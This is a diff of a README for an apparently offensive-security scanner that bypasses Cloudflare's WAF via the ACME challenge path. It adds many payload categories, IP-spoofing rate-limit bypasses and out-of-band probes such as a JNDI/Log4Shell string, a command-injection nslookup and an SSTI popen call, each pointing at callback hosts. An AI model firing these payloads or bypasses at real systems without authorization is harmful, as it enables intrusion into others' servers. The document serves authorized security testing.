@@ -1,5 +1,32 @@
 # Cloudflare ACME Challenge WAF Bypass Scanner
 
+## 🆕 Update v2.0 (January 2025)
+
+### New Features:
+- ✨ **Modular Architecture** - Kode dipecah menjadi modul terpisah untuk maintainability
+- 🔄 **Improved OAST** - Better Out-of-band testing dengan multiple Interactsh servers
+- 🎯 **Enhanced Origin IP Discovery** - DNS history via hackertarget.com API
+- 🧠 **Multi-LLM Support** - OpenAI, Anthropic, Ollama, Groq, Gemini
+- 📝 **Auto POC Generation** - Python, Bash, Nuclei, Burp Suite templates
+- ⚡ **Cache Poisoning Detection** - Deteksi vulnerable cache dengan parameter manipulation
+- 🛡️ **Rate Limit Bypass Testing** - 12+ header variations untuk IP spoofing
+
+### Code Structure:
+```
+├── scanner.py          # Entry point (CLI)
+├── core/
+│   ├── scanner.py      # CloudflareScanner class
+│   ├── oast.py         # OAST client & server
+│   ├── poc_generator.py # Auto POC generation
+│   └── llm_analyzer.py # AI vulnerability analysis
+└── utils/
+    ├── config.py       # Configuration loader
+    ├── constants.py    # Banner, user agents
+    └── payloads.py     # All vulnerability payloads
+```
+
+---
+
 ## 📖 Research Reference
 Based on **FearsOff Research**: [Cloudflare Zero-day: Accessing Any Host Globally](https://fearsoff.org/research/cloudflare-acme)
 
@@ -42,18 +69,25 @@ This tool is created **ONLY** for:
 | Category | Payloads | Description |
 |----------|----------|-------------|
 | **ACME WAF Bypass** | 3 | Core bypass via /.well-known/acme-challenge/ |
-| **Spring Actuator** | 19 | `..;/` traversal to actuator endpoints |
-| **PHP LFI** | 9 | Local File Inclusion via path traversal |
-| **Next.js SSR** | 7 | Server-side rendering data exposure |
-| **Path Traversal** | 6 | Multiple encoding techniques |
-| **CF WAF Bypass** | 14 | URL encoding, unicode, null bytes |
-| **CF Specific Paths** | 12 | /cdn-cgi/, /.well-known/ paths |
-| **Cache Poisoning** | 4 | X-Forwarded-Host, cache key manipulation |
-| **Host Header Injection** | 8 | Multiple host header variations |
-| **Rate Limit Bypass** | 12 | IP spoofing headers |
-| **Sensitive Paths** | 25 | Admin, configs, debug via ACME bypass |
-| **GraphQL** | 3 | Introspection via ACME path |
-| **Header Bypass** | 6 | X-middleware-subrequest, etc. |
+| **Spring Actuator** | 23 | `..;/` traversal to actuator endpoints |
+| **PHP LFI** | 20 | Local File Inclusion via path traversal |
+| **Next.js SSR** | 9 | Server-side rendering data exposure |
+| **Path Traversal** | 10 | Multiple encoding techniques |
+| **CF WAF Bypass** | 21 | URL encoding, unicode, null bytes |
+| **CF Specific Paths** | 16 | /cdn-cgi/, /.well-known/ paths |
+| **Cache Poisoning** | 8 | X-Forwarded-Host, cache key manipulation |
+| **Host Header Injection** | 11 | Multiple host header variations |
+| **Rate Limit Bypass** | 16 | IP spoofing headers |
+| **Sensitive Paths** | 60+ | Admin, configs, debug via ACME bypass |
+| **GraphQL** | 5 | Introspection via ACME path |
+| **SSRF** | 25 | Server-side request forgery (localhost, cloud metadata) |
+| **XSS** | 17 | Cross-site scripting payloads |
+| **SQLi** | 16 | SQL injection payloads |
+| **XXE** | 4 | XML External Entity |
+| **SSTI** | 10 | Server-side template injection |
+| **Command Injection** | 21 | OS command injection |
+| **Log4Shell/JNDI** | 7 | Log4j vulnerability payloads |
+| **OAST Blind Vuln** | 28+ | SSRF, XSS, XXE, Log4Shell, SSTI |
 
 ### Origin IP Discovery Methods
 1. **Response Headers** - X-Served-By, X-Backend-Server, Via, etc.
@@ -68,8 +102,8 @@ This tool is created **ONLY** for:
 
 ```bash
 # Clone repository
-git clone https://github.com/yourusername/Cloudflare-0day.git
-cd Cloudflare-0day
+git clone https://github.com/adhaikal/Cloudflare-ACME-WAF-Bypass-Scanner.git
+cd Cloudflare-ACME-WAF-Bypass-Scanner
 
 # Install dependencies
 pip install -r requirements.txt
@@ -110,6 +144,62 @@ python scanner.py -u https://example.com -t 5 -T 15 -d 1 -v -o results.json
 | `-o, --output` | Output file (JSON) | - |
 | `-v, --verbose` | Verbose mode | False |
 | `--token` | Custom ACME challenge token | Random |
+| `--oast` | Enable OAST (Out-of-band) testing | False |
+| `--oast-server` | Interactsh server to use | Random |
+| `--oast-domain` | Custom callback domain | - |
+| `--oast-wait` | Wait time for callbacks (seconds) | 30 |
+
+## 🔬 OAST (Out-of-band Application Security Testing)
+
+OAST enables detection of **blind vulnerabilities** that don't show immediate responses:
+
+```bash
+# Enable OAST with default Interactsh servers
+python scanner.py -u https://target.com --oast
+
+# Use specific Interactsh server
+python scanner.py -u https://target.com --oast --oast-server interact.sh
+
+# Use your own callback server
+python scanner.py -u https://target.com --oast --oast-domain your-domain.com
+
+# Start your own OAST callback server
+python scanner.py --oast-server-mode --oast-port 8080
+
+# Combine with other features
+python scanner.py -l targets.txt --oast --analyze --poc
+```
+
+### OAST Vulnerability Types Detected:
+
+| Type | Description | Payload Example |
+|------|-------------|-----------------|
+| **Blind SSRF** | Server makes request to callback | `?url=http://callback.oast.pro/` |
+| **Blind XSS** | XSS payload triggers callback | `<script src=http://cb.oast.pro>` |
+| **XXE OOB** | XML parser fetches external entity | `<!ENTITY xxe SYSTEM "http://cb.oast.pro">` |
+| **Command Injection** | OS command triggers DNS/HTTP | `;nslookup callback.oast.pro` |
+| **Log4Shell/JNDI** | Log4j vulnerability | `${jndi:ldap://callback.oast.pro/a}` |
+| **SSTI OOB** | Template injection with callback | `{{...popen('nslookup cb.oast.pro')...}}` |
+
+### How OAST Works:
+
+```
+┌──────────────┐      1. Send payload with callback URL      ┌──────────────┐
+│   Scanner    │ ────────────────────────────────────────────▶│    Target    │
+└──────────────┘                                              └──────────────┘
+       ▲                                                             │
+       │                                                             │
+       │                    3. Report callback                       │ 2. If vulnerable,
+       │                       received                              │    target contacts
+       │                                                             │    callback server
+       │                                                             ▼
+       │         ┌──────────────────────────────────────────────────────────┐
+       └─────────│  OAST Server (Interactsh / Your Server)                  │
+                 │  - Receives HTTP callbacks                                │
+                 │  - Receives DNS queries                                   │
+                 │  - Records source IP, payload ID                          │
+                 └──────────────────────────────────────────────────────────┘
+```
 
 ## 🎯 Payload Examples
 
@@ -228,6 +318,7 @@ python scanner.py -l targets.txt --analyze --llm openai --analysis-output report
 | Anthropic | claude-sonnet-4-20250514 | `ANTHROPIC_API_KEY` |
 | Ollama | llama3.2 | Not required (local) |
 | Groq | llama-3.3-70b-versatile | `GROQ_API_KEY` |
+| Gemini | gemini-1.5-flash | `GEMINI_API_KEY` |
 
 **LLM Analysis includes:**
 - Risk Assessment (Critical/High/Medium/Low)
@@ -300,9 +391,17 @@ python scanner.py -l targets.txt --analyze --llm openai --analysis-output report
 ## 📜 Legal
 Ensure you have written permission before performing security testing on any target. Use of this tool is entirely your responsibility.
 
-## 🔗 References
+## � Credits
+- **FearsOff** - Original vulnerability research
+- **ProjectDiscovery** - Interactsh OAST servers
+- **hackertarget.com** - DNS history API
+
+## �🔗 References
 - [FearsOff Research](https://fearsoff.org/research/cloudflare-acme)
 - [Cloudflare Blog](https://blog.cloudflare.com/acme-path-vulnerability/)
 
 ## 📝 License
 MIT License - See LICENSE file for details
+
+---
+**Made with ❤️ for Security Researchers**
